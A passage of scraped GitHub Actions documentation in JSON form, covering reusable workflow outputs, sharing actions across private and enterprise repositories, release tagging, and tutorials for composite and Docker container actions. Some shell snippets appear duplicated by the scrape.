        "content": "name: Reusable workflow\n\non:\n  workflow_call:\n    # Map the workflow outputs to job outputs\n    outputs:\n      firstword:\n        description: \"The first output string\"\n        value: ${{ jobs.example_job.outputs.output1 }}\n      secondword:\n        description: \"The second output string\"\n        value: ${{ jobs.example_job.outputs.output2 }}\n\njobs:\n  example_job:\n    name: Generate output\n    runs-on: ubuntu-latest\n    # Map the job outputs to step outputs\n    outputs:\n      output1: ${{ steps.step1.outputs.firstword }}\n      output2: ${{ steps.step2.outputs.secondword }}\n    steps:\n      - id: step1\n        run: echo \"firstword=hello\" >> $GITHUB_OUTPUT\n      - id: step2\n        run: echo \"secondword=world\" >> $GITHUB_OUTPUT"
      },
      {
        "type": "paragraph",
        "text": "We can now use the outputs in the caller workflow, in the same way you would use the outputs from a job within the same workflow. We reference the outputs using the names defined at the workflow level in the reusable workflow:firstwordandsecondword. In this workflow,job1calls the reusable workflow andjob2prints the outputs from the reusable workflow (\"hello world\") to standard output in the workflow log."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Call a reusable workflow and use its outputs\n\non:\n  workflow_dispatch:\n\njobs:\n  job1:\n    uses: octo-org/example-repo/.github/workflows/called-workflow.yml@v1\n\n  job2:\n    runs-on: ubuntu-latest\n    needs: job1\n    steps:\n      - run: echo ${{ needs.job1.outputs.firstword }} ${{ needs.job1.outputs.secondword }}"
      },
      {
        "type": "paragraph",
        "text": "For more information on using job outputs, seeWorkflow syntax for GitHub Actions. If you want to share something other than a variable (e.g. a build artifact) between workflows, seeStoring and sharing data from a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Monitoring which workflows are being used"
      },
      {
        "type": "paragraph",
        "text": "Organizations that use GitHub Enterprise Cloud can interact with the audit log via the GitHub REST API to monitor which workflows are being used. For more information, seethe GitHub Enterprise Cloud documentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Re-running workflows and jobs with reusable workflows"
      },
      {
        "type": "paragraph",
        "text": "Reusable workflows from public repositories can be referenced using a SHA, a release tag, or a branch name. For more information, seeReusing workflows."
      },
      {
        "type": "paragraph",
        "text": "When you re-run a workflow that uses a reusable workflow and the reference is not a SHA, there are some behaviors to be aware of:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Re-running all jobs in a workflow will use the reusable workflow from the specified reference. For more information about re-running all jobs in a workflow, seeRe-running workflows and jobs.",
          "Re-running failed jobs or a specific job in a workflow will use the reusable workflow from the same commit SHA of the first attempt. For more information about re-running failed jobs in a workflow, seeRe-running workflows and jobs. For more information about re-running a specific job in a workflow, seeRe-running workflows and jobs."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "paragraph",
        "text": "To continue learning about GitHub Actions, seeEvents that trigger workflows."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-from-your-private-repository",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About GitHub Actions access to private repositories"
      },
      {
        "type": "paragraph",
        "text": "You can share actions and reusable workflows from your private repository, without making them public, by allowing GitHub Actions workflows to access a private repository that contains the action or reusable workflow."
      },
      {
        "type": "paragraph",
        "text": "Any actions or reusable workflows stored in the private repository can be used in workflows defined in other private repositories owned by the same organization or user. Actions and reusable workflows stored in private repositories cannot be used in public repositories."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If you make a private repository accessible to GitHub Actions workflows in other repositories, outside collaborators on the other repositories can indirectly access the private repository, even though they do not have direct access to these repositories. The outside collaborators can view logs for workflow runs when actions or workflows from the private repository are used.",
          "To allow runners to download these actions, GitHub passes a scoped installation token to the runner. This token has read access to the repository, and automatically expires after one hour."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Sharing actions and workflows from your private repository"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Store the action or reusable workflow in a private repository. For more information, seeAbout repositories.",
          "Configure the repository to allow access to workflows in other private repositories. For more information, seeManaging GitHub Actions settings for a repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Reusing workflows"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-with-your-enterprise",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About GitHub Actions access to internal and private repositories"
      },
      {
        "type": "paragraph",
        "text": "If your organization is owned by an enterprise account, you can share actions and reusable workflows within your enterprise, without publishing them publicly, by allowing GitHub Actions workflows to access an internal or private repository that contains the action or reusable workflow."
      },
      {
        "type": "paragraph",
        "text": "Any actions or reusable workflows stored in the internal or private repository can be used in workflows defined in other internal or private repositories owned by the same organization, or by any organization owned by the enterprise. Actions and reusable workflows stored in internal repositories cannot be used in public repositories and actions and reusable workflows stored in private repositories cannot be used in public or internal repositories."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If you make a private repository accessible to GitHub Actions workflows in other repositories, outside collaborators on the other repositories can indirectly access the private repository, even though they do not have direct access to these repositories. The outside collaborators can view logs for workflow runs when actions or workflows from the private repository are used.",
          "To allow runners to download these actions, GitHub passes a scoped installation token to the runner. This token has read access to the repository, and automatically expires after one hour."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Sharing actions and workflows with your enterprise"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Store the action or reusable workflow in an internal or private repository. For more information, seeAbout repositories.",
          "Configure the repository to allow access to workflows in other internal or private repositories. For more information, seeManaging GitHub Actions settings for a repositoryandManaging GitHub Actions settings for a repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "About enterprise accounts",
          "Reusing workflows"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/sharing-actions-and-workflows-with-your-organization",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About GitHub Actions access to private repositories"
      },
      {
        "type": "paragraph",
        "text": "You can share actions and reusable workflows within your organization, without publishing them publicly, by allowing GitHub Actions workflows to access a private repository that contains the action or reusable workflow."
      },
      {
        "type": "paragraph",
        "text": "Any actions or reusable workflows stored in the private repository can be used in workflows defined in other private repositories owned by the same organization. Actions and reusable workflows stored in private repositories cannot be used in public repositories."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If you make a private repository accessible to GitHub Actions workflows in other repositories, outside collaborators on the other repositories can indirectly access the private repository, even though they do not have direct access to these repositories. The outside collaborators can view logs for workflow runs when actions or workflows from the private repository are used.",
          "To allow runners to download these actions, GitHub passes a scoped installation token to the runner. This token has read access to the repository, and automatically expires after one hour."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Sharing actions and workflows with your organization"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Store the action or reusable workflow in a private repository. For more information, seeAbout repositories.",
          "Configure the repository to allow access to workflows in other private repositories. For more information, seeManaging GitHub Actions settings for a repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Reusing workflows"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About custom actions"
      },
      {
        "type": "paragraph",
        "text": "You can create actions by writing custom code that interacts with your repository in any way you'd like, including integrating with GitHub's APIs and any publicly available third-party API. For example, an action can publish npm modules, send SMS alerts when urgent issues are created, or deploy production-ready code."
      },
      {
        "type": "paragraph",
        "text": "You can write your own actions to use in your workflow or share the actions you build with the GitHub community. To share actions you've built with everyone, your repository must be public."
      },
      {
        "type": "paragraph",
        "text": "Actions can run directly on a machine or in a Docker container. You can define an action's inputs, outputs, and environment variables."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Types of actions"
      },
      {
        "type": "paragraph",
        "text": "You can build Docker container, JavaScript, and composite actions. Actions require a metadata file to define the inputs, outputs and main entrypoint for your action. The metadata filename must beaction.yml. For more information, seeMetadata syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Docker container actions"
      },
      {
        "type": "paragraph",
        "text": "Docker containers package the environment with the GitHub Actions code. This creates a more consistent and reliable unit of work because the consumer of the action does not need to worry about the tools or dependencies."
      },
      {
        "type": "paragraph",
        "text": "A Docker container allows you to use specific versions of an operating system, dependencies, tools, and code. For actions that must run in a specific environment configuration, Docker is an ideal option because you can customize the operating system and tools. Because of the latency to build and retrieve the container, Docker container actions are slower than JavaScript actions."
      },
      {
        "type": "paragraph",
        "text": "Docker container actions can only execute on runners with a Linux operating system. Self-hosted runners must use a Linux operating system and have Docker installed to run Docker container actions. For more information about the requirements of self-hosted runners, seeAbout self-hosted runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "JavaScript actions"
      },
      {
        "type": "paragraph",
        "text": "JavaScript actions can run directly on a runner machine, and separate the action code from the environment used to run the code. Using a JavaScript action simplifies the action code and executes faster than a Docker container action."
      },
      {
        "type": "paragraph",
        "text": "To ensure your JavaScript actions are compatible with all GitHub-hosted runners (Ubuntu, Windows, and macOS), the packaged JavaScript code you write should be pure JavaScript and not rely on other binaries. JavaScript actions run directly on the runner and use binaries that already exist in the runner image."
      },
      {
        "type": "paragraph",
        "text": "If you're developing a Node.js project, the GitHub Actions Toolkit provides packages that you can use in your project to speed up development. For more information, see theactions/toolkitrepository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Composite Actions"
      },
      {
        "type": "paragraph",
        "text": "Acompositeaction allows you to combine multiple workflow steps within one action. For example, you can use this feature to bundle together multiple run commands into an action, and then have a workflow that executes the bundled commands as a single step using that action. To see an example, check outCreating a composite action."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Choosing a location for your action"
      },
      {
        "type": "paragraph",
        "text": "If you're developing an action for other people to use, we recommend keeping the action in its own repository instead of bundling it with other application code. This allows you to version, track, and release the action just like any other software."
      },
      {
        "type": "paragraph",
        "text": "Storing an action in its own repository makes it easier for the GitHub community to discover the action, narrows the scope of the code base for developers fixing issues and extending the action, and decouples the action's versioning from the versioning of other application code."
      },
      {
        "type": "paragraph",
        "text": "If you're building an action that you don't plan to make available to others, you  can store the action's files in any location in your repository. If you plan to combine action, workflow, and application code in a single repository, we recommend storing actions in the.githubdirectory. For example,.github/actions/action-aand.github/actions/action-b."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Ensuring compatibility with other platforms"
      },
      {
        "type": "paragraph",
        "text": "Many people access GitHub at a domain other than GitHub.com, such as GHE.com or a custom domain for GitHub Enterprise Server."
      },
      {
        "type": "paragraph",
        "text": "To ensure that your action is compatible with other platforms, do not use any hard-coded references to API URLs such ashttps://api.github.com. Instead, you can:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Use environment variables (seeStore information in variables):For the REST API, use theGITHUB_API_URLenvironment variable.For GraphQL, use theGITHUB_GRAPHQL_URLenvironment variable.",
          "For the REST API, use theGITHUB_API_URLenvironment variable.",
          "For GraphQL, use theGITHUB_GRAPHQL_URLenvironment variable.",
          "Use a toolkit such as@actions/github, which can automatically set the correct URLs."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using release management for actions"
      },
      {
        "type": "paragraph",
        "text": "This section explains how you can use release management to distribute updates to your actions in a predictable way."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Good practices for release management"
      },
      {
        "type": "paragraph",
        "text": "If you're developing an action for other people to use, we recommend using release management to control how you distribute updates. Users can expect an action's patch version to include necessary critical fixes and security patches, while still remaining compatible with their existing workflows. You should consider releasing a new major version whenever your changes affect compatibility."
      },
      {
        "type": "paragraph",
        "text": "Under this release management approach, users should not be referencing an action's default branch, as it's likely to contain the latest code and consequently might be unstable. Instead, you can recommend that your users specify a major version when using your action, and only direct them to a more specific version if they encounter issues."
      },
      {
        "type": "paragraph",
        "text": "To use a specific action version, users can configure their GitHub Actions workflow to target a tag, a commit's SHA, or a branch named for a release."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using tags for release management"
      },
      {
        "type": "paragraph",
        "text": "We recommend using tags for actions release management. Using this approach, your users can easily distinguish between major and minor versions:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Create and validate a release on a release branch (such asrelease/v1) before creating the release tag (for example,v1.0.2).",
          "Create a release using semantic versioning. For more information, seeManaging releases in a repository.",
          "Move the major version tag (such asv1,v2) to point to the Git ref of the current release. For more information, seeGit basics - tagging.",
          "Introduce a new major version tag (v2) for changes that will break existing workflows. For example, changing an action's inputs would be a breaking change.",
          "Major versions can be initially released with abetatag to indicate their status, for example,v2-beta. The-betatag can then be removed when ready."
        ]
      },
      {
        "type": "paragraph",
        "text": "This example demonstrates how a user can reference a major release tag:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n    - uses: actions/javascript-action@v1"
      },
      {
        "type": "paragraph",
        "text": "This example demonstrates how a user can reference a specific patch release tag:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n    - uses: actions/javascript-action@v1.0.1"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using branches for release management"
      },
      {
        "type": "paragraph",
        "text": "If you prefer to use branch names for release management, this example demonstrates how to reference a named branch:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n    - uses: actions/javascript-action@v1-beta"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a commit's SHA for release management"
      },
      {
        "type": "paragraph",
        "text": "Each Git commit receives a calculated SHA value, which is unique and immutable. Your action's users might prefer to rely on a commit's SHA value, as this approach can be more reliable than specifying a tag, which could be deleted or moved. However, this means that users will not receive further updates made to the action. You must use a commit's full SHA value, and not an abbreviated value."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n    - uses: actions/javascript-action@a824008085750b8e136effc585c3cd6082bd575f"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating a README file for your action"
      },
      {
        "type": "paragraph",
        "text": "We recommend creating a README file to help people learn how to use your action. You can include this information in yourREADME.md:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A detailed description of what the action does",
          "Required input and output arguments",
          "Optional input and output arguments",
          "Secrets the action uses",
          "Environment variables the action uses",
          "An example of how to use your action in a workflow"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Comparing GitHub Actions to GitHub Apps"
      },
      {
        "type": "paragraph",
        "text": "GitHub Marketplace offers tools to improve your workflow. Understanding the differences and the benefits of each tool will allow you to select the best tool for your job. For more information about building apps, seeAbout creating GitHub Apps."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Strengths of GitHub Actions and GitHub Apps"
      },
      {
        "type": "paragraph",
        "text": "While both GitHub Actions and GitHub Apps provide ways to build automation and workflow tools, they each have strengths that make them useful in different ways."
      },
      {
        "type": "paragraph",
        "text": "GitHub Apps:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Run persistently and can react to events quickly.",
          "Work great when persistent data is needed.",
          "Work best with API requests that aren't time consuming.",
          "Run on a server or compute infrastructure that you provide."
        ]
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Provide automation that can perform continuous integration and continuous deployment.",
          "Can run directly on runner machines or in Docker containers.",
          "Can include access to a clone of your repository, enabling deployment and publishing tools, code formatters, and command line tools to access your code.",
          "Don't require you to deploy code or serve an app.",
          "Have a simple interface to create and use secrets, which enables actions to interact with third-party services without needing to store the credentials of the person using the action."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Workflow commands for GitHub Actions"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-composite-action",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "In this guide, you'll learn about the basic components needed to create and use a packaged composite action. To focus this guide on the components needed to package the action, the functionality of the action's code is minimal. The action prints \"Hello World\" and then \"Goodbye\", or if you provide a custom name, it prints \"Hello [who-to-greet]\" and then \"Goodbye\". The action also maps a random number to therandom-numberoutput variable, and runs a script namedgoodbye.sh."
      },
      {
        "type": "paragraph",
        "text": "Once you complete this project, you should understand how to build your own composite action and test it in a workflow."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "When creating workflows and actions, you should always consider whether your code might execute untrusted input from possible attackers. Certain contexts should be treated as untrusted input, as an attacker could insert their own malicious content. For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Composite actions and reusable workflows"
      },
      {
        "type": "paragraph",
        "text": "Composite actions allow you to collect a series of workflow job steps into a single action which you can then run as a single job step in multiple workflows. Reusable workflows provide another way of avoiding duplication, by allowing you to run a complete workflow from within other workflows. For more information, seeAvoiding duplication."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This example explains how to create a composite action within a separate repository. However, it is possible to create a composite action within the same repository. For more information, seeCreating a composite action."
      },
      {
        "type": "paragraph",
        "text": "Before you begin, you'll create a repository on GitHub."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a new public repository on GitHub. You can choose any repository name, or use the followinghello-world-composite-actionexample. You can add these files after your project has been pushed to GitHub. For more information, seeCreating a new repository.",
          "Clone your repository to your computer. For more information, seeCloning a repository.",
          "From your terminal, change directories into your new repository.Shellcd hello-world-composite-actioncd hello-world-composite-action",
          "In thehello-world-composite-actionrepository, create a new file calledgoodbye.shwith example code:Shellecho \"echo Goodbye\" > goodbye.shecho \"echo Goodbye\" > goodbye.sh",
          "From your terminal, makegoodbye.shexecutable.Shellchmod +x goodbye.shchmod +x goodbye.shShellchmod +x goodbye.shchmod +x goodbye.shShellgit add --chmod=+x -- goodbye.shgit add --chmod=+x -- goodbye.sh",
          "From your terminal, check in yourgoodbye.shfile.Shellgit add goodbye.sh\ngit commit -m \"Add goodbye script\"\ngit pushgit add goodbye.sh\ngit commit -m \"Add goodbye script\"\ngit pushShellgit add goodbye.sh\ngit commit -m \"Add goodbye script\"\ngit pushgit add goodbye.sh\ngit commit -m \"Add goodbye script\"\ngit pushShellgit commit -m \"Add goodbye script\"\ngit pushgit commit -m \"Add goodbye script\"\ngit push"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating an action metadata file"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In thehello-world-composite-actionrepository, create a new file calledaction.ymland add the following example code. For more information about this syntax, seeMetadata syntax for GitHub Actions.YAMLname: 'Hello World'\ndescription: 'Greet someone'\ninputs:\n  who-to-greet:  # id of input\n    description: 'Who to greet'\n    required: true\n    default: 'World'\noutputs:\n  random-number:\n    description: \"Random number\"\n    value: ${{ steps.random-number-generator.outputs.random-number }}\nruns:\n  using: \"composite\"\n  steps:\n    - name: Set Greeting\n      run: echo \"Hello $INPUT_WHO_TO_GREET.\"\n      shell: bash\n      env:\n        INPUT_WHO_TO_GREET: ${{ inputs.who-to-greet }}\n\n    - name: Random Number Generator\n      id: random-number-generator\n      run: echo \"random-number=$(echo $RANDOM)\" >> $GITHUB_OUTPUT\n      shell: bash\n\n    - name: Set GitHub Path\n      run: echo \"$GITHUB_ACTION_PATH\" >> $GITHUB_PATH\n      shell: bash\n      env:\n        GITHUB_ACTION_PATH: ${{ github.action_path }}\n\n    - name: Run goodbye.sh\n      run: goodbye.sh\n      shell: bashname:'Hello World'description:'Greet someone'inputs:who-to-greet:# id of inputdescription:'Who to greet'required:truedefault:'World'outputs:random-number:description:\"Random number\"value:${{steps.random-number-generator.outputs.random-number}}runs:using:\"composite\"steps:-name:SetGreetingrun:echo\"Hello $INPUT_WHO_TO_GREET.\"shell:bashenv:INPUT_WHO_TO_GREET:${{inputs.who-to-greet}}-name:RandomNumberGeneratorid:random-number-generatorrun:echo\"random-number=$(echo $RANDOM)\">>$GITHUB_OUTPUTshell:bash-name:SetGitHubPathrun:echo\"$GITHUB_ACTION_PATH\">>$GITHUB_PATHshell:bashenv:GITHUB_ACTION_PATH:${{github.action_path}}-name:Rungoodbye.shrun:goodbye.shshell:bashThis file defines thewho-to-greetinput, maps the random generated number to therandom-numberoutput variable, adds the action's path to the runner system path (to locate thegoodbye.shscript during execution), and runs thegoodbye.shscript.For more information about managing outputs, seeMetadata syntax for GitHub Actions.For more information about how to usegithub.action_path, seeAccessing contextual information about workflow runs.",
          "From your terminal, check in youraction.ymlfile.Shellgit add action.yml\ngit commit -m \"Add action\"\ngit pushgit add action.yml\ngit commit -m \"Add action\"\ngit push",
          "From your terminal, add a tag. This example uses a tag calledv1. For more information, seeAbout custom actions.Shellgit tag -a -m \"Description of this release\" v1\ngit push --follow-tagsgit tag -a -m \"Description of this release\" v1\ngit push --follow-tags"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Testing out your action in a workflow"
      },
      {
        "type": "paragraph",
        "text": "The following workflow code uses the completed hello world action that you made inCreating a composite action."
      },
      {
        "type": "paragraph",
        "text": "Copy the workflow code into a.github/workflows/main.ymlfile in another repository, replacingOWNERandSHAwith the repository owner and the SHA of the commit you want to use, respectively. You can also replace thewho-to-greetinput with your name."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: [push]\n\njobs:\n  hello_world_job:\n    runs-on: ubuntu-latest\n    name: A job to say hello\n    steps:\n      - uses: actions/checkout@v4\n      - id: foo\n        uses: OWNER/hello-world-composite-action@SHA\n        with:\n          who-to-greet: 'Mona the Octocat'\n      - run: echo random-number \"$RANDOM_NUMBER\"\n        shell: bash\n        env:\n          RANDOM_NUMBER: ${{ steps.foo.outputs.random-number }}"
      },
      {
        "type": "paragraph",
        "text": "From your repository, click theActionstab, and select the latest workflow run. The output should include: \"Hello Mona the Octocat\", the result of the \"Goodbye\" script, and a random number."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating a composite action within the same repository"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a new subfolder calledhello-world-composite-action, this can be placed in any subfolder within the repository. However, it is recommended that this be placed in the.github/actionssubfolder to make organization easier.",
          "In thehello-world-composite-actionfolder, do the same steps to create thegoodbye.shscriptShellecho \"echo Goodbye\" > goodbye.shecho \"echo Goodbye\" > goodbye.shShellchmod +x goodbye.shchmod +x goodbye.shShellchmod +x goodbye.shchmod +x goodbye.shShellgit add --chmod=+x -- goodbye.shgit add --chmod=+x -- goodbye.shShellgit add goodbye.sh\ngit commit -m \"Add goodbye script\"\ngit pushgit add goodbye.sh\ngit commit -m \"Add goodbye script\"\ngit pushShellgit add goodbye.sh\ngit commit -m \"Add goodbye script\"\ngit pushgit add goodbye.sh\ngit commit -m \"Add goodbye script\"\ngit pushShellgit commit -m \"Add goodbye script\"\ngit pushgit commit -m \"Add goodbye script\"\ngit push",
          "In thehello-world-composite-actionfolder, create theaction.ymlfile based on the steps inCreating a composite action.",
          "When using the action, use the relative path to the folder where the composite action'saction.ymlfile is located in theuseskey. The below example assumes it is in the.github/actions/hello-world-composite-actionfolder."
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: [push]\n\njobs:\n  hello_world_job:\n    runs-on: ubuntu-latest\n    name: A job to say hello\n    steps:\n      - uses: actions/checkout@v4\n      - id: foo\n        uses: ./.github/actions/hello-world-composite-action\n        with:\n          who-to-greet: 'Mona the Octocat'\n      - run: echo random-number \"$RANDOM_NUMBER\"\n        shell: bash\n        env:\n          RANDOM_NUMBER: ${{ steps.foo.outputs.random-number }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Example composite actions on GitHub"
      },
      {
        "type": "paragraph",
        "text": "You can find many examples of composite actions on GitHub."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "microsoft/action-python",
          "microsoft/gpt-review",
          "tailscale/github-action"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "In this guide, you'll learn about the basic components needed to create and use a packaged Docker container action. To focus this guide on the components needed to package the action, the functionality of the action's code is minimal. The action prints \"Hello World\" in the logs or \"Hello [who-to-greet]\" if you provide a custom name."
      },
      {
        "type": "paragraph",
        "text": "Once you complete this project, you should understand how to build your own Docker container action and test it in a workflow."
      },
      {
        "type": "paragraph",
        "text": "Self-hosted runners must use a Linux operating system and have Docker installed to run Docker container actions. For more information about the requirements of self-hosted runners, seeAbout self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "When creating workflows and actions, you should always consider whether your code might execute untrusted input from possible attackers. Certain contexts should be treated as untrusted input, as an attacker could insert their own malicious content. For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "You must create a repository on GitHub and clone it to your workstation. For more information, seeCreating a new repositoryandCloning a repository.",
          "If your repository uses Git LFS, you must include the objects in archives of your repository. For more information, seeManaging Git LFS objects in archives of your repository.",
          "You may find it helpful to have a basic understanding of GitHub Actions, environment variables and the Docker container filesystem. For more information, seeStore information in variablesandUsing GitHub-hosted runners."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating a Dockerfile"
      },
      {
        "type": "paragraph",
        "text": "In your newhello-world-docker-actiondirectory, create a newDockerfilefile. Make sure that your filename is capitalized correctly (use a capitalDbut not a capitalf) if you're having issues. For more information, seeDockerfile support for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Dockerfile"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# Container image that runs your code\nFROM alpine:3.10\n\n# Copies your code file from your action repository to the filesystem path `/` of the container\nCOPY entrypoint.sh /entrypoint.sh\n\n# Code file to execute when the docker container starts up (`entrypoint.sh`)\nENTRYPOINT [\"/entrypoint.sh\"]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating an action metadata file"
      },
      {
        "type": "paragraph",
        "text": "Create a newaction.ymlfile in thehello-world-docker-actiondirectory you created above. For more information, seeMetadata syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "action.yml"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# action.yml\nname: 'Hello World'\ndescription: 'Greet someone and record the time'\ninputs:\n  who-to-greet:  # id of input\n    description: 'Who to greet'\n    required: true\n    default: 'World'\noutputs:\n  time: # id of output\n    description: 'The time we greeted you'\nruns:\n  using: 'docker'\n  image: 'Dockerfile'\n  args:\n    - ${{ inputs.who-to-greet }}"
      },
      {
        "type": "paragraph",
        "text": "This metadata defines onewho-to-greetinput and onetimeoutput parameter. To pass inputs to the Docker container, you should declare the input usinginputsand pass the input in theargskeyword. Everything you include inargsis passed to the container, but for better discoverability for users of your action, we recommended using inputs."
      },
      {
        "type": "paragraph",
        "text": "GitHub will build an image from yourDockerfile, and run commands in a new container using this image."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Writing the action code"
      },
      {
        "type": "paragraph",
        "text": "You can choose any base Docker image and, therefore, any language for your action. The following shell script example uses thewho-to-greetinput variable to print \"Hello [who-to-greet]\" in the log file."
      },
      {
        "type": "paragraph",
        "text": "Next, the script gets the current time and sets it as an output variable that actions running later in a job can use. In order for GitHub to recognize output variables, you must write them to the$GITHUB_OUTPUTenvironment file:echo \"<output name>=<value>\" >> $GITHUB_OUTPUT. For more information, seeWorkflow commands for GitHub Actions."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a newentrypoint.shfile in thehello-world-docker-actiondirectory.",
          "Add the following code to yourentrypoint.shfile.entrypoint.shShell#!/bin/sh -l\n\necho \"Hello $1\"\ntime=$(date)\necho \"time=$time\" >> $GITHUB_OUTPUT#!/bin/sh -lecho \"Hello $1\"\ntime=$(date)\necho \"time=$time\" >> $GITHUB_OUTPUTIfentrypoint.shexecutes without any errors, the action's status is set tosuccess. You can also explicitly set exit codes in your action's code to provide an action's status. For more information, seeSetting exit codes for actions.",
          "Make yourentrypoint.shfile executable. Git provides a way to explicitly change the permission mode of a file so that it doesn’t get reset every time there is a clone/fork.Shellgit add entrypoint.sh\ngit update-index --chmod=+x entrypoint.shgit add entrypoint.sh\ngit update-index --chmod=+x entrypoint.sh",
          "Optionally, to check the permission mode of the file in the git index, run the following command.Shellgit ls-files --stage entrypoint.shgit ls-files --stage entrypoint.shAn output like100755 e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 0       entrypoint.shmeans the file has the executable permission. In this example,755denotes the executable permission."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating a README"
      },
      {
        "type": "paragraph",
        "text": "To let people know how to use your action, you can create a README file. A README is most helpful when you plan to share your action publicly, but is also a great way to remind you or your team how to use the action."
      },
      {
        "type": "paragraph",
        "text": "In yourhello-world-docker-actiondirectory, create aREADME.mdfile that specifies the following information:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A detailed description of what the action does.",
          "Required input and output arguments.",
          "Optional input and output arguments.",
          "Secrets the action uses.",
          "Environment variables the action uses.",
          "An example of how to use your action in a workflow."
        ]
      },
      {
        "type": "paragraph",
        "text": "README.md"
      },
      {
        "type": "code",
        "language": "yaml",
